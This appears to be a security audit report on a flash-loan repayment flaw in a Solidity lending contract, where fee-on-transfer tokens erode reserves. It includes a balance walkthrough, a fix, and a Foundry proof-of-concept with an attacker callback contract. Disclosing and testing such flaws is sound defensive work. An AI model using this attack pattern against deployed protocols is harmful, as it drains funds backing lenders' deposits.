### Title
Flash Loan Repayment Uses Nominal Amount Without Balance Check, Allowing Fee-on-Transfer Tokens to Drain Protocol Reserves - (File: src/Midnight.sol)

### Summary
The `flashLoan` function in `src/Midnight.sol` sends `assets[i]` tokens outbound and then pulls back exactly `assets[i]` tokens inbound via `safeTransferFrom`, with no pre/post balance check. For fee-on-transfer tokens, the inbound `safeTransferFrom` call succeeds (the call itself does not revert) but Midnight receives only `assets[i] - fee` tokens, permanently reducing the protocol's reserve by `fee` per flash loan invocation. The formal verification in `certora/specs/Solvency.spec` explicitly assumes standard ERC20 semantics (no fee-on-transfer), so the `tokenBalanceCorrect` invariant does not cover this case.

### Finding Description

**Exact code path** (`src/Midnight.sol`, lines 737–751):

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // (A)
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // (B)
    }
}
```

`SafeTransferLib.safeTransfer` and `safeTransferFrom` only verify that the call does not revert and that the boolean return value (if any) is `true`. They perform no balance-delta check.

**Root cause:** The repayment check is purely nominal. The protocol verifies that `transferFrom(callback, this, assets[i])` succeeds, but never verifies that `balanceOf(address(this))` is restored to its pre-loan value.

**Attacker-controlled inputs:**
- `tokens[i]`: any fee-on-transfer ERC20 (e.g., a token with a 1% transfer fee)
- `assets[i]`: any amount for which Midnight holds a balance
- `callback`: attacker-controlled contract implementing `IFlashLoanCallback`

**Exploit flow (per token, per call):**

| Step | Action | Midnight balance | Callback balance |
|------|--------|-----------------|-----------------|
| Start | — | B | 0 |
| (A) `safeTransfer(token, callback, assets[i])` | Fee deducted on outbound | B − assets[i] | assets[i] − fee |
| `onFlashLoan` | Callback tops up `fee` from own reserves; approves Midnight for `assets[i]` | B − assets[i] | assets[i] |
| (B) `safeTransferFrom(token, callback, this, assets[i])` | Fee deducted on inbound | B − assets[i] + (assets[i] − fee) = **B − fee** | 0 |

The call at (B) does not revert — `transferFrom` returns `true` — but Midnight receives only `assets[i] − fee`. The protocol's balance is permanently reduced by `fee`.

**Why existing checks fail:**
- `SafeTransferLib.safeTransferFrom` only checks the boolean return value, not the actual received amount.
- There is no `balanceBefore` / `balanceAfter` guard anywhere in `flashLoan`.
- The Certora `tokenBalanceCorrect` invariant is proven only under the explicit assumption `// no fee taking from sender or receiver` (Solvency.spec line 31–33), so it does not protect against this case.
- `live_context.json` line 233 lists fee-on-transfer tokens as requiring testing "if not explicitly excluded," and no such exclusion exists in the contract.

### Impact Explanation
For every `flashLoan` call using a fee-on-transfer token, the protocol's token balance decreases by exactly `fee` (the token's transfer fee applied to `assets[i]`). This directly erodes the reserves backing lender withdrawals, collateral claims, and fee distributions. Repeated calls compound the loss linearly. The invariant "contract balances cover collateral, credit redemption, fees, and withdrawable assets" is violated.

### Likelihood Explanation
**Preconditions:**
1. A fee-on-transfer token must be present in Midnight's balance (as a loan token or collateral token in any market, or via direct transfer).
2. The attacker must control a callback contract that can top up `fee` tokens and approve the repayment.
3. No privileged access is required; `flashLoan` is fully permissionless.

**Feasibility:** Fee-on-transfer tokens are a real, deployed token class. The `flashLoan` function imposes no token whitelist. The attack is repeatable indefinitely at the cost of `fee` tokens per call (griefing / slow drain). If the attacker can source the fee tokens cheaply (e.g., by borrowing them elsewhere), the cost approaches zero relative to the damage inflicted on protocol solvency.

### Recommendation
Add a per-token balance check before and after the full flash loan cycle:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
    // ... callback ...
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(
        IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore,
        BalanceDecreased()
    );
}
```

Alternatively, document and enforce that fee-on-transfer tokens are not supported in any Midnight market or flash loan, and add an explicit revert if the post-loan balance is below the pre-loan balance.

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// @dev ERC20 that deducts 1% fee on every transfer/transferFrom
contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant FEE_BPS = 100; // 1%

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fee = amount * FEE_BPS / 10000;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount - fee;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        uint256 fee = amount * FEE_BPS / 10000;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        return true;
    }
}

contract AttackerCallback is IFlashLoanCallback {
    FeeToken token;
    Midnight midnight;
    uint256 flashAmount;

    constructor(FeeToken _t, Midnight _m, uint256 _a) { token = _t; midnight = _m; flashAmount = _a; }

    function onFlashLoan(address, address[] memory, uint256[] memory, bytes memory)
        external returns (bytes32)
    {
        // Top up the fee so we can repay the nominal amount
        uint256 fee = flashAmount * 100 / 10000;
        token.mint(address(this), fee); // attacker sources fee tokens
        token.approve(address(midnight), flashAmount);
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    Midnight midnight;
    FeeToken token;

    function setUp() public {
        midnight = new Midnight(/* constructor args */);
        token = new FeeToken();
    }

    function test_flashLoanDrainsReserveWithFeeToken() public {
        uint256 amount = 1000e18;
        uint256 fee = amount * 100 / 10000; // 1% = 10e18

        // Seed Midnight with token balance (simulates existing market deposits)
        token.mint(address(midnight), amount);
        uint256 balanceBefore = token.balanceOf(address(midnight));
        assertEq(balanceBefore, amount);

        AttackerCallback cb = new AttackerCallback(token, midnight, amount);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        midnight.flashLoan(tokens, amounts, address(cb), "");

        uint256 balanceAfter = token.balanceOf(address(midnight));
        // ASSERTION: balance decreased by fee — invariant violated
        assertEq(balanceBefore - balanceAfter, fee, "protocol drained by fee");
        assertLt(balanceAfter, balanceBefore, "balance must not decrease after flash loan — VIOLATED");
    }
}
